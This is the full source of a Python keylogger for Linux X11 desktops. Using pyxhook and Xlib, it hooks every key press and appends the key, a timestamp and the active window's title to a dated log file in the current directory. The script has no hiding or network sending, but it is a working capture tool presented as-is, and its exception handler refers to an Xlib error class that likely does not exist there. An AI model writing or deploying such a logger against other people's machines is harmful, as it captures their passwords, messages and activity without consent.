import os
from datetime import datetime
import pyxhook
import psutil
from Xlib import X, display

def get_active_window_name():
    try:
        d = display.Display()
        root = d.screen().root
        window_id = root.get_full_property(d.intern_atom("_NET_ACTIVE_WINDOW"), X.AnyPropertyType).value[0]
        window = d.create_resource_object("window", window_id)
        window.change_attributes(event_mask=X.FocusChangeMask)
        window_name = window.get_full_property(d.intern_atom("_NET_WM_NAME"), 0).value
        return window_name.decode("utf-8")
    except X.error.XError:
        pass
    return None

def main():
    # Specify the name of the file (can be changed)
    log_file = os.path.join(os.getcwd(), datetime.now().strftime("%d-%m-%Y|%H:%M") + ".log")

    # The logging function with event parameter
    def OnKeyPress(event):
        active_window = get_active_window_name()

        if active_window:
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now()}] Application: {active_window}, Key: {event.Key}\n")

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # Set the hook

    try:
        new_hook.start()  # Start the hook
    except KeyboardInterrupt:
        # User canceled from the command line, so close the listener
        new_hook.cancel()
    except Exception as ex:
        # Write exceptions to the log file for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")

if __name__ == "__main__":
    main()
